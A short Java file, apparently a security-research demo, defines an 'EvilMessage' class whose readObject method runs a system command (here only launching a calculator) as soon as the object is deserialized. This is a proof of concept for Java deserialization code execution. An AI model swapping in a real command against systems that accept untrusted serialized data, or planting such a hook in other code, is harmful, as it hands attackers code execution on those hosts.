package com.longofo.example;

import java.io.ObjectInputStream;

public class EvilMessage extends Message {
    private void readObject(ObjectInputStream s) {
        try {
            s.defaultReadObject();
            Runtime.getRuntime().exec("calc");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
